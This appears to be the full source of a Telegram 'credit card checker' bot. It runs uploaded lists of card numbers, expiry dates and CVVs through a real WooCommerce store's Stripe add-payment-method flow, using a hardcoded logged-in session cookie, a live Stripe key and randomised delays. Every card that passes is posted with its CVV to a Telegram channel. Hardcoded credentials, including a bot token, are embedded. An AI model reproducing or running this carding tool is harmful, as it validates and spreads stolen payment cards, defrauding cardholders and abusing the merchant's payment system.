import aiohttp
import asyncio
import json
import random
import os
import sys
from datetime import datetime
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

# ===================== CONFIGURATION =====================
load_dotenv()

DOMAIN = os.getenv("DOMAIN", "https://dainte.com")
PK = os.getenv("STRIPE_PK", "pk_live_51F0CDkINGBagf8ROVbhXA43bHPn9cGEHEO55TN2mfNGYsbv2DAPuv6K0LoVywNJKNuzFZ4xGw94nVElyYg1Aniaf00QDrdzPhf")
CHANNEL_ID = os.getenv("CHANNEL_ID", "-1003673366048")
ADMIN_IDS = os.getenv("ADMIN_IDS", "1318826936").split(",") if os.getenv("ADMIN_IDS") else []

# Global variables
bot_running = True
current_task = None
approved_cards_list = []

# ===================== ORIGINAL CARD CHECKING FUNCTIONS =====================

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json_data=None,
):
    try:
        async with session.request(
            method,
            url,
            params=params,
            headers=headers,
            data=data,
            json=json_data,
        ) as response:
            return await response.text(), response.status
    except Exception as e:
        return None, 0

async def ppc(card_data, card_num, total_cards, user_id=None, username=None):
    """မူရင်း card checking function"""
    try:
        cc, mon, year, cvv = card_data.split("|")
    except ValueError:
        return f"❌ [{card_num}/{total_cards}] Invalid card format"
    
    year = year[-2:]
    cc = cc.replace(" ", "")
    
    original_card = f"{cc}|{mon}|{year}|{cvv}"
    
    cookies = {
        '_gcl_au': '1.1.1390503211.1765951324',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-12-17%2005%3A32%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdainte.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdainte.com%2F',
        'sbjs_first_add': 'fd%3D2025-12-17%2005%3A32%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdainte.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdainte.com%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        '_ga': 'GA1.1.1266478631.1765951325',
        'tk_ai': 'LaEUcf+uHuLLEv8nDuZ++YlO',
        '__stripe_mid': 'df552a5d-837a-4c22-8b94-6e0c6126fe57fc8cb8',
        '__stripe_sid': '40098deb-638d-48d0-b1ad-8a99af0d8cbeb99daf',
        'tk_or': '%22%22',
        'tk_r3d': '%22%22',
        'tk_lr': '%22%22',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Safari%2F537.36',
        '_lscache_vary': 'fe945544100d8ff68c3bab5f9d991cf8',
        'wordpress_logged_in_6d38d63c396edb46dc077c5e4dd298a7': 'ohmyqueenmedusa%7C1766556437%7CzJQumMwlWkTb2WjElYB3ftRAcQcOwxlHPiwELPUvQTD%7C934b3951bd21b3559e879e24c3996e064e00a2f28d57851391e999db0c079d09',
        'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdainte.com%2Fmy-account%2Fpayment-methods%2F',
        '_ga_0PCFHXZV00': 'GS2.1.s1765951324$o1$g1$t1765951669$j31$l0$h0',
        'tk_qs': '',
        '_uetsid': 'ea8f3740db0d11f09ea82f57fd1361ff',
        '_uetvid': 'ea906540db0d11f09dc0c3bce871cd9b',
    }

    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        cookies=cookies
    ) as session:

        # Step 1: Get the payment method page
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9,nl;q=0.8,ar;q=0.7",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "priority": "u=0, i",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        }

        req, status = await make_request(
            session,
            url=f"{DOMAIN}/my-account/add-payment-method/",
            method="GET",
            headers=headers,
        )
        
        if req is None:
            return f"❌ [{card_num}/{total_cards}] Failed to get payment method page"
        
        setup_intent_nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')
        if setup_intent_nonce == "None":
            return f"❌ [{card_num}/{total_cards}] No setup intent nonce found"

        await asyncio.sleep(random.uniform(2, 4))

        # Step 2: Create payment method with Stripe
        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        }

        data2 = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": year,
            "card[exp_month]": mon,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "billing_details[name]": "Test User",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "referrer": DOMAIN,
            "time_on_page": "187650",
            "key": PK,
            "_stripe_version": "2024-06-20",
        }

        req2, status2 = await make_request(
            session,
            "https://api.stripe.com/v1/payment_methods",
            headers=headers2,
            data=data2,
        )
        
        if req2 is None:
            return f"❌ [{card_num}/{total_cards}] Failed to create payment method"
            
        try:
            pm_data = json.loads(req2)
            if 'error' in pm_data:
                return f"❌ [{card_num}/{total_cards}] Stripe error: {pm_data['error']['message']}"
            pmid = pm_data.get('id')
            if not pmid:
                return f"❌ [{card_num}/{total_cards}] No payment method ID"
        except json.JSONDecodeError:
            return f"❌ [{card_num}/{total_cards}] Invalid JSON response from Stripe"

        await asyncio.sleep(random.uniform(1, 2))

        # Step 3: Send to WooCommerce admin-ajax.php
        headers3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9,nl;q=0.8,ar;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": DOMAIN,
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        data3 = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_intent_nonce,
        }

        req3, status3 = await make_request(
            session,
            url=f"{DOMAIN}/wp-admin/admin-ajax.php",
            headers=headers3,
            data=data3,
        )
        
        if req3:
            try:
                result_data = json.loads(req3)
                if result_data.get('success'):
                    result_message = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}"
                    
                    # ✅ Store approved card for channel posting
                    card_info = {
                        "card": original_card,
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "user_id": user_id,
                        "username": username,
                        "card_num": card_num,
                        "total_cards": total_cards
                    }
                    
                    # Add to approved cards list
                    global approved_cards_list
                    approved_cards_list.append(card_info)
                    
                    return result_message
                else:
                    error_msg = "Unknown error"
                    try:
                        if 'data' in result_data and 'error' in result_data['data']:
                            error_msg = result_data['data']['error']['message']
                        elif 'message' in result_data:
                            error_msg = result_data['message']
                    except:
                        error_msg = str(result_data)
                    
                    return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗘𝗿𝗿𝗼𝗿: {error_msg}"
            except json.JSONDecodeError:
                return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {req3}"
        
        return f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌ [{card_num}/{total_cards}]\n𝗖𝗖: {cc}|{mon}|{year}|{cvv}\n𝗡𝗼 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 𝗳𝗿𝗼𝗺 𝘀𝗲𝗿𝘃𝗲𝗿"

# ===================== CHANNEL POSTING FUNCTIONS =====================

async def post_to_channel(bot: Bot, card_info):
    """Post approved card to Telegram channel"""
    try:
        message = (
            f"🎉 **NEW APPROVED CARD** 🎉\n\n"
            f"💳 `{card_info['card']}`\n"
            f"⏰ {card_info['timestamp']}\n"
            f"📊 Progress: {card_info['card_num']}/{card_info['total_cards']}\n"
        )
        
        if card_info.get('username'):
            message += f"👤 Checked by: @{card_info['username']}"
        
        await bot.send_message(
            chat_id=CHANNEL_ID,
            text=message,
            parse_mode="Markdown"
        )
        print(f"✅ Approved card posted to channel: {card_info['card']}")
        return True
    except Exception as e:
        print(f"❌ Failed to post to channel: {e}")
        return False

async def post_batch_to_channel(bot: Bot, cards_batch, batch_number):
    """Post multiple approved cards as a batch"""
    try:
        if not cards_batch:
            return False
        
        batch_message = f"📦 **BATCH #{batch_number} - APPROVED CARDS**\n\n"
        
        for i, card_info in enumerate(cards_batch, 1):
            batch_message += f"{i}. `{card_info['card']}`\n"
            batch_message += f"   ⏰ {card_info['timestamp']}\n"
            if card_info.get('username'):
                batch_message += f"   👤 @{card_info['username']}\n"
            batch_message += "\n"
        
        batch_message += f"✅ Total: {len(cards_batch)} cards"
        
        await bot.send_message(
            chat_id=CHANNEL_ID,
            text=batch_message,
            parse_mode="Markdown"
        )
        print(f"✅ Batch #{batch_number} posted to channel with {len(cards_batch)} cards")
        return True
    except Exception as e:
        print(f"❌ Failed to post batch to channel: {e}")
        return False

async def check_and_post_approved_cards(bot: Bot):
    """Check and post approved cards to channel"""
    global approved_cards_list
    
    if not approved_cards_list:
        return 0
    
    posted_count = 0
    temp_list = approved_cards_list.copy()
    
    for card_info in temp_list:
        try:
            if await post_to_channel(bot, card_info):
                posted_count += 1
                approved_cards_list.remove(card_info)
                await asyncio.sleep(1)
        except Exception as e:
            print(f"Error posting card: {e}")
    
    return posted_count

# ===================== TELEGRAM BOT FUNCTIONS =====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    global bot_running
    bot_running = True
    
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    
    welcome_text = (
        f"🔄 Credit Card Checker Bot\n"
        f"👤 User: @{username}\n\n"
        f"📁 Send .txt file with format:\n"
        f"card|month|year|cvv\n\n"
        f"Example:\n4111111111111111|12|2026|123\n\n"
        f"🔸 **Commands:**\n"
        f"/start - Start bot\n"
        f"/stop - Stop checking\n"
        f"/status - Check status\n"
        f"/postnow - Post approved cards to channel (Admin only)\n\n"
        f"✅ Approved cards auto-posted to channel."
    )
    await update.message.reply_text(welcome_text)
    
    print(f"👤 User @{username} (ID: {user_id}) started bot")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    global bot_running, current_task
    
    if not bot_running:
        await update.message.reply_text("⚠️ Bot is not running.")
        return
    
    bot_running = False
    
    if current_task and not current_task.done():
        current_task.cancel()
        try:
            await current_task
        except asyncio.CancelledError:
            pass
    
    await update.message.reply_text("🛑 **Checking stopped!**\nUse /start to restart.")
    print("🛑 User requested stop via /stop command")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    global bot_running, approved_cards_list
    
    status_text = "🟢 Bot running" if bot_running else "🔴 Bot stopped"
    
    status_message = (
        f"📊 **Bot Status**\n"
        f"{status_text}\n"
        f"📈 Approved cards waiting: {len(approved_cards_list)}\n\n"
        f"🔸 **Commands:**\n"
        f"/start - Start bot\n"
        f"/stop - Stop checking\n"
        f"/status - This page\n"
        f"/postnow - Post to channel (Admin)"
    )
    
    await update.message.reply_text(status_message)

async def postnow_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /postnow command"""
    user_id = str(update.effective_user.id)
    
    # Check admin access
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    global approved_cards_list
    
    if not approved_cards_list:
        await update.message.reply_text("ℹ️ No approved cards to post.")
        return
    
    await update.message.reply_text(f"📤 Posting {len(approved_cards_list)} cards to channel...")
    
    posted_count = 0
    bot = context.bot
    
    # Post in batches of 5
    for i in range(0, len(approved_cards_list), 5):
        batch = approved_cards_list[i:i+5]
        if await post_batch_to_channel(bot, batch, i//5 + 1):
            posted_count += len(batch)
        await asyncio.sleep(1)
    
    # Clear list
    approved_cards_list = []
    
    await update.message.reply_text(f"✅ {posted_count} cards posted to channel.")

async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming text files"""
    global bot_running, current_task, approved_cards_list
    
    if not bot_running:
        await update.message.reply_text("⚠️ Bot stopped. Use /start to restart.")
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Send .txt file only")
        return
    
    await update.message.reply_text("📥 File received, checking...")
    
    # Download file
    file = await document.get_file()
    temp_file = f"temp_{user_id}_{document.file_name}"
    await file.download_to_drive(temp_file)
    
    try:
        with open(temp_file, 'r', encoding='utf-8') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            await update.message.reply_text("❌ Empty or invalid file")
            return
        
        total_cards = len(cards)
        await update.message.reply_text(
            f"🔍 **Checking Started**\n"
            f"👤 User: @{username}\n"
            f"📊 Cards: {total_cards}\n"
            f"✅ Approved cards auto-posted to channel.\n\n"
            f"🛑 Stop with /stop"
        )
        
        approved = 0
        declined = 0
        results = []
        checked_cards = 0
        
        bot_instance = context.bot
        
        for i, card in enumerate(cards, 1):
            if not bot_running:
                await update.message.reply_text(
                    f"🛑 **Stopped!**\n"
                    f"Checked: {checked_cards}/{total_cards}\n"
                    f"✅ Approved: {approved}\n"
                    f"❌ Declined: {declined}"
                )
                break
            
            try:
                current_task = asyncio.create_task(ppc(card, i, total_cards, user_id, username))
                result = await current_task
                
                results.append(result)
                checked_cards = i
                
                if "✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥" in result:
                    approved += 1
                    
                    # Post approved card to channel
                    if approved_cards_list:
                        last_card = approved_cards_list[-1]
                        if await post_to_channel(bot_instance, last_card):
                            approved_cards_list.remove(last_card)
                else:
                    declined += 1
                
            except asyncio.CancelledError:
                await update.message.reply_text("🛑 Checking cancelled")
                break
            except Exception as e:
                error_result = f"❌ Error [{i}/{total_cards}]\nCard: {card}\nError: {str(e)}"
                results.append(error_result)
                declined += 1
                checked_cards = i
            
            # Progress update
            if i % 5 == 0 or i == total_cards:
                progress_msg = (
                    f"📊 **Progress:** {i}/{total_cards}\n"
                    f"✅ Approved: {approved} | ❌ Declined: {declined}"
                )
                await update.message.reply_text(progress_msg)
                
                # Send last 3 results
                if results:
                    await update.message.reply_text('\n'.join(results[-3:]))
            
            # Delay between cards
            if i < total_cards and bot_running:
                delay = random.uniform(10, 15)
                for _ in range(int(delay)):
                    if not bot_running:
                        break
                    await asyncio.sleep(1)
        
        # Final summary if not stopped
        if bot_running:
            summary = [
                "🎯 **Check Completed**",
                f"📊 Total: {total_cards}",
                f"✅ Approved: {approved}",
                f"❌ Declined: {declined}",
                f"📈 Success rate: {(approved/total_cards)*100:.1f}%" if total_cards > 0 else "📈 Success rate: 0%",
                "",
                f"✅ Approved cards posted to channel."
            ]
            await update.message.reply_text('\n'.join(summary))
        
        # Post any remaining approved cards
        if approved_cards_list:
            remaining_count = len(approved_cards_list)
            await update.message.reply_text(
                f"📤 Posting {remaining_count} approved cards to channel..."
            )
            posted = await check_and_post_approved_cards(bot_instance)
            if posted > 0:
                await update.message.reply_text(
                    f"✅ {posted} cards posted to channel."
                )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        # Cleanup
        if os.path.exists(temp_file):
            os.remove(temp_file)
        
        current_task = None

# ===================== MAIN FUNCTION =====================

def main():
    """Main function for Render hosting"""
    # Get configuration
    BOT_TOKEN = "8569583023:AAFNKM3mkumVNrpj9uOZ-32fV3sP3nZ0TSo"
    
    if not BOT_TOKEN:
        print("❌ Error: BOT_TOKEN not set in environment!")
        print("Please set BOT_TOKEN in Render environment variables")
        return
    
    # Check channel config
    if CHANNEL_ID == "@your_channel_username":
        print("⚠️ Warning: CHANNEL_ID not configured")
    
    print(f"🤖 Starting Telegram Bot...")
    print(f"📢 Channel: {CHANNEL_ID}")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print("=" * 40)
    
    try:
        # Create application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("stop", stop_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("postnow", postnow_command))
        app.add_handler(MessageHandler(filters.Document.ALL, handle_text_file))
        
        # Start bot
        print("✅ Bot is running...")
        print("📋 Available commands:")
        print("  /start    - Start the bot")
        print("  /stop     - Stop current checking")
        print("  /status   - Check bot status")
        print("  /postnow  - Post approved cards to channel")
        print("=" * 40)
        
        app.run_polling()
        
    except Exception as e:
        print(f"❌ Bot error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
